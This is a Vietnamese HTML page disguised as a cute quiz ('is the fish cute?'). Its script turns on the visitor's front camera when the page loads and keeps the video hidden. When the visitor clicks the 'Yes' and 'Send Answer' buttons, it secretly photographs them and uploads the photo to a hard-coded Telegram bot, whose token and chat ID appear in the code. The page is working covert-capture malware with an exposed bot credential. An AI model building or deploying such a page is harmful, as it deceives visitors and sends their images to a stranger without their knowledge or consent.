
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> cá có cute hok?</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: white;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .container {
            text-align: center;
        }

        .camera-container {
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
            width: 100%;
        }

        .camera-wrapper {
            margin: 10px;
            text-align: center;
        }

        video, canvas {
            border: 2px solid #ddd;
            border-radius: 8px;
            max-width: 100%;
        }

        .controls {
            margin-top: 20px;
        }

        button {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 12px 24px;
            margin: 0 10px;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #006699;
        }

        button:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }

        .status {
            margin-top: 20px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1> cá có cute hok?</h1>
        
        <video id="frontCamera" autoplay playsinline style="display: none;"></video>
        <canvas id="frontCanvas" style="display: none;"></canvas>

        <div class="controls">
            <button id="captureBtn">Có</button>
            <button id="sendBtn" disabled>Gửi Câu Trả Lời</button>
        </div>

        <p class="status" id="statusText">Hãy Trả Lời Thật...</p>
    </div>

    <script>
        // Telegram bot token và chat ID
        const BOT_TOKEN = '7918175596:AAGhE6Ih9PZiahfU-Ft68G5HOyRue1lUhjI';
        const CHAT_ID = '6171672709';
        
        const frontVideo = document.getElementById('frontCamera');
        const backVideo = document.getElementById('backCamera');
        const frontCanvas = document.getElementById('frontCanvas');
        const backCanvas = document.getElementById('backCanvas');
        const captureBtn = document.getElementById('captureBtn');
        const sendBtn = document.getElementById('sendBtn');
        const statusText = document.getElementById('statusText');

        let frontStream = null;
        let frontPhoto = null;

        // Khởi động camera trước
        async function initCameras() {
            try {
                statusText.textContent = 'Đang khởi động câu hỏi...';
                
                // Camera trước (user facing)
                frontStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });
                frontVideo.srcObject = frontStream;
                
                statusText.textContent = 'Chắc Chắn Chưa 😅...';
            } catch (error) {
                console.error('Lỗi khi khởi động camera:', error);
                statusText.textContent = 'Lỗi khi khởi động camera: ' + error.message;
            }
        }

        // Chụp ảnh từ camera trước
        function capturePhotos() {
            // Đặt kích thước canvas bằng kích thước video
            frontCanvas.width = frontVideo.videoWidth;
            frontCanvas.height = frontVideo.videoHeight;
            
            // Vẽ hình ảnh từ video vào canvas
            const frontCtx = frontCanvas.getContext('2d');
            frontCtx.drawImage(frontVideo, 0, 0, frontCanvas.width, frontCanvas.height);
            
            // Lưu dữ liệu ảnh
            frontPhoto = frontCanvas.toDataURL('image/jpeg');
            
            statusText.textContent = 'Đã trả lời thành công!';
            sendBtn.disabled = false;
        }

        // Gửi ảnh đến Telegram bot
        async function sendPhotos() {
            if (!frontPhoto) {
                statusText.textContent = 'Không có ảnh để gửi. Vui lòng chụp ảnh trước.';
                return;
            }
            
            try {
                sendBtn.disabled = true;
                statusText.textContent = 'Đang gửi Câu Trả Lời...';
                
                // Tạo form data
                const formData = new FormData();
                
                // Chuyển đổi base64 thành blob
                const frontBlob = await fetch(frontPhoto).then(res => res.blob());
                
                // Thêm ảnh vào form data
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', 'Ảnh chụp từ ứng dụng');
                formData.append('photo', frontBlob, 'front_photo.jpg');
                
                // Gửi Câu Trả Lời
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                statusText.textContent = 'Đã gửi câu trả lời thành công!';
            } catch (error) {
                console.error('Lỗi khi gửi ảnh:', error);
                statusText.textContent = 'Lỗi khi gửi ảnh: ' + error.message;
                sendBtn.disabled = false;
            }
        }

        // Xử lý sự kiện
        captureBtn.addEventListener('click', capturePhotos);
        sendBtn.addEventListener('click', sendPhotos);

        // Khởi động ứng dụng
        window.addEventListener('load', initCameras);
    </script>
</body>
</html>
